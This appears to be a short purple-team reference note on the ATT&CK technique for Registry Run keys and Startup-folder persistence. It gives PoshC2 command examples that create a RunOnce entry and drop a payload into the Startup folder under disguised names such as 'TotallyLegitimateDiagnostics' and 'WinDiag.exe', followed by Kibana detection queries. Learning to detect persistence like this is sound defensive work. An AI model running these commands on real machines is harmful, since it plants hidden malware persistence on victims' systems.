# [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)

## Folder Locations: 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
C:\Users[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

## Exploit syntax:
* Reference [Modify registry](/Poshc2/instructions/Modify_registry.md) for syntax to add a key to run or runonce keys within victim registry

* Reference [Redundant access](/Poshc2/instructions/Reduntant_access.md) for syntax to add files to folder locations

* Example syntax for registry key:
    ```powershell
    sharpreg create "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" "TotallyLegitimateDiagnostics" "C:\Windows\TLD\regvrs32.exe" EXPAND_SZ
    ```

* Example syntax for startup folder:
    ```powershell
    upload-file 
    <press enter> 
    '/var/YourMalware.exe'
    <press enter> 'C:\ProgramData\\Microsoft\Windows\Start Menu\\Programs\StartUp\WinDiag.exe'
    <press enter>
    ```
## Detection Technique:
* Investigating registry Run and Startup folder

 * Kibana:
    * Example for registry key:
        * event.code: 13
        * event.action: "Registry value set (rule: RegistryEvent)"
        * registry.path:  "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce*"
    * Example for startup folder:
        * event.code: 11
        * event.action: File created (rule: FileCreate)
        * file.directory: "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup*"
        